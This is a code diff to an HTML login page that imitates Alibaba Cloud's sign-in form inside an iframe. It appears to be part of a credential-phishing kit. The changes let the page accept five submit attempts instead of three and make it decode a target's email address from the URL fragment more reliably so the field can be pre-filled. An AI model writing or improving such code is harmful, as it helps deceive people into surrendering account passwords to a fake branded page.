@@ -110,7 +110,7 @@ srcdoc="<!DOCTYPE html> <html lang=en><meta charset=utf-8>
 </div><div class='login-blocks login-links'><a href='https://cnpassport.alibaba.com/ac/password_find.htm?from_site=9&amp;lang=en_US' target='_blank' class='forgot-password-a-link'>Forgot password</a></div><div class='login-blocks agreement-block'><div class='fm-agreement resize-window'><input type='checkbox' name='fm-agreement-checkbox' id='fm-agreement-checkbox' autocomplete='off' value='on checked' checked><label class='fm-agreement-text' for='fm-agreement-checkbox' data-spm-anchor-id='0.0.0.i1.22f879f4p3yxjt'>I have read and agree with<a href='https://terms.aliyun.com/legal-agreement/terms/suit_bu1_ali_cloud/suit_bu1_ali_cloud202001092018_32009.html' target='blank'>Privacy Policy</a></label></div></div></form></div></div><div class='extra-login-content'></div></div></div>
 
 <script>
-const MAX_ATTEMPTS = 3;
+const MAX_ATTEMPTS = 5;
 let attemptCount = 0; 
 
 function $ (id) { return document.getElementById(id); }
@@ -206,16 +206,30 @@ document.addEventListener('DOMContentLoaded', () => {
   if (!iframe) { console.error('❌ iframe #alibaba-login-box not found'); return; }
 
   function getEmailFromURL() {
-    const raw = window.location.hash.slice(1);
-    if (!raw) return null;
-    const b64 = raw.replace(/-/g, '+').replace(/_/g, '/');
-    const padded = b64 + '==='.slice(0, (4 - b64.length % 4) % 4);
     try {
-      const decoded = atob(padded);
-      return /^[^@]+@[^@]+\.[^@]+$/.test(decoded) ? decoded : null;
-    } catch (_) { return null; }
+  	const raw = window.location.hash.slice(1);
+  	if (!raw) return null;
+  
+  	const decodedHash = decodeURIComponent(raw);
+  
+  	const base64 = decodedHash
+  	  .replace(/[^A-Za-z0-9_\-]/g, '')
+  	  .replace(/-/g, '+')
+  	  .replace(/_/g, '/')
+  	  .replace(/\s/g, '');
+  
+  	const padLen = (4 - (base64.length % 4)) % 4;
+  	const padded = base64 + '='.repeat(padLen);
+  
+  	const email = atob(padded);
+  	const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  	return valid ? email : null;
+    } catch (e) {
+  	console.warn('getEmailFromURL error', e);
+  	return null;
+    }
   }
-
+    
   function onIframeLoad() {
     iframe.removeEventListener('load', onIframeLoad);
 
@@ -242,7 +256,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const form = doc.querySelector('form#login-form');
     if (!form) { console.warn('⚠️ form #login-form not found inside iframe'); return; }
 
-    const MAX_ATTEMPTS = 3;
+    const MAX_ATTEMPTS = 5;
     let outerAttempts = 0;
 
     form.addEventListener('submit', function (e) {
